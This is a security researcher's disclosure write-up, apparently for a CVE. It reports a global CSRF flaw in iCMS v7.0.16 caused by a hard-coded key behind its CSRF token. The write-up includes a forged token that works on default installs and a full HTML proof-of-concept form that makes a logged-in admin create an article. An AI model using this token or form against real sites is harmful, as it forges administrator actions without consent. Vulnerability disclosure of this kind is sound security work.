## Global CSRF Vulnerability Caused by Logic Defect in iCMS v7.0.16

The "CSRF_TOKEN"  param has been set when I try to find some CSRF vuln in the iCMS v7.0.16, but it is finally turned out to be a "fake CSRF_TOKEN" after I audit source code.

### location

The calculation logic of csrf_token is located in：

![](https://github.com/0-error/myCVE/blob/gh-pages/pictures/cve9.png)

it is based the value of "key" in the line 385, and the "key" is calculated by the value of "iPHP_KEY", the "iPHP_KEY" is hard coded in the source code. like：

![](https://github.com/0-error/myCVE/blob/gh-pages/pictures/cve10.png)

And then we can see the "CSRF_TOKEN" check logic in here:

![](https://github.com/0-error/myCVE/blob/gh-pages/pictures/cve11.png)

if the time is in the scope, and the values are equal, the check will be fine. So the problem is the "csrf_token" is hard coded in the source code, but not binding with the Identity，and the default expiration time("iPHP_COOKIE_TIME") is too long (as the picture show is 31536000 seconds). if someone builds a website with default configuration, the csrf_token can be fully forged.
 
### proof

we can just use the "authcode" function to create a "csrf_token", here is : 9041868bvetZwR1LmSKxbAKQMzFoR6mwPIZzKQA8SVCJiuwTgSqofazrzNTgVilHb1s8CJI1dK6Y7cJfayPMQO-NYT-9ClZ_lLl3y0Q

and then we make a poc for csrf to add an article ,like:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.64.2/iCMS-7.0.16/admincp.php?app=article&do=save&frame=iPHP&CSRF_TOKEN=9041868bvetZwR1LmSKxbAKQMzFoR6mwPIZzKQA8SVCJiuwTgSqofazrzNTgVilHb1s8CJI1dK6Y7cJfayPMQO-NYT-9ClZ_lLl3y0Q" method="POST">
      <input type="hidden" name="&#95;cid" value="" />
      <input type="hidden" name="&#95;scid" value="" />
      <input type="hidden" name="&#95;tags" value="" />
      <input type="hidden" name="&#95;pid" value="" />
      <input type="hidden" name="&#95;data&#95;id" value="" />
      <input type="hidden" name="article&#95;id" value="0" />
      <input type="hidden" name="userid" value="1" />
      <input type="hidden" name="ucid" value="" />
      <input type="hidden" name="postype" value="1" />
      <input type="hidden" name="REFERER" value="http&#58;&#47;&#47;192&#46;168&#46;64&#46;2&#47;iCMS&#45;7&#46;0&#46;16&#47;admincp&#46;php&#63;app&#61;article&amp;do&#61;trash" />
      <input type="hidden" name="chapter" value="" />
      <input type="hidden" name="markdown" value="0" />
      <input type="hidden" name="cid" value="4" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="scid&#91;&#93;" value="4" />
      <input type="hidden" name="pid&#91;&#93;" value="0" />
      <input type="hidden" name="title" value="fasdhfas" />
      <input type="hidden" name="stitle" value="fasdfa" />
      <input type="hidden" name="source" value="fads" />
      <input type="hidden" name="author" value="fs" />
      <input type="hidden" name="editor" value="iCMS" />
      <input type="hidden" name="pic" value="" />
      <input type="hidden" name="mpic" value="" />
      <input type="hidden" name="spic" value="" />
      <input type="hidden" name="keywords" value="fasdf" />
      <input type="hidden" name="tags" value="" />
      <input type="hidden" name="description" value="dfasdfasd" />
      <input type="hidden" name="data&#95;id" value="" />
      <input type="hidden" name="subtitle" value="fasd" />
      <input type="hidden" name="autopic" value="1" />
      <input type="hidden" name="body&#91;&#93;" value="&lt;p&gt;fadsfasd&lt;&#47;p&gt;" />
      <input type="hidden" name="pubdate" value="2021&#45;01&#45;24&#32;16&#58;05&#58;50" />
      <input type="hidden" name="sortnum" value="1611475550" />
      <input type="hidden" name="weight" value="1611475550" />
      <input type="hidden" name="hits" value="0" />
      <input type="hidden" name="hits&#95;today" value="0" />
      <input type="hidden" name="hits&#95;yday" value="0" />
      <input type="hidden" name="hits&#95;week" value="0" />
      <input type="hidden" name="hits&#95;month" value="0" />
      <input type="hidden" name="favorite" value="0" />
      <input type="hidden" name="comments" value="0" />
      <input type="hidden" name="good" value="0" />
      <input type="hidden" name="bad" value="0" />
      <input type="hidden" name="tpl" value="" />
      <input type="hidden" name="clink" value="" />
      <input type="hidden" name="url" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

and take this in my vps website , the article will be created when the user click the website in my vps, like :

![](https://github.com/0-error/myCVE/blob/gh-pages/pictures/cve12.png)

This is a global problem, the "csrf_token" is not fully protective here and many operations will involve csrf vulnerabilities .


